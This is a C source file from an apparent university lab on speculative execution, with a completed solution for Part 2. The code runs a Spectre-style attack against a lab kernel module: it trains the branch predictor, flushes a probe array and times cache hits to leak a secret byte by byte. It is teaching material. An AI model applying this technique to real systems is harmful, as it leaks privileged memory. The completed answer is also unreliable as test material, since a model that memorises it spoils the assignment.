/*
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define CACHE_HIT_THRESHOLD 100

char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN] = {0};

/*
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 2]- Fill this in!
        // leaked_byte = ??

        int scores[256] = {0};

        for (int attempt = 0; attempt < 200; attempt++) {

            // 1. TRAIN branch predictor
            for (int i = 0; i < 50; i++) {
                call_kernel_part2(kernel_fd, shared_memory, i % 8);
            }

            // 2. FLUSH probe array
            for (int i = 0; i < 256; i++) {
                clflush(shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE);
            }

            mfence();
            usleep(5);

            // 3. SPECULATIVE call
            call_kernel_part2(kernel_fd, shared_memory, current_offset);

            // 4. MEASURE
            for (int i = 0; i < 256; i++) {
                uint64_t time = time_access(shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE);

                if (time < CACHE_HIT_THRESHOLD) {
                    scores[i]+= 3;
                }
            }
        }

        // pick best guess
        int best_index = 0;
        for (int i = 1; i < 256; i++) {
            if (scores[i] > scores[best_index]) {
                best_index = i;
            }
        }

        leaked_byte = (char)best_index;

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            leaked_str[current_offset] = '\0';
            break;
        }
        
    }

    leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1] = '\0';
    printf("\n\n[Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
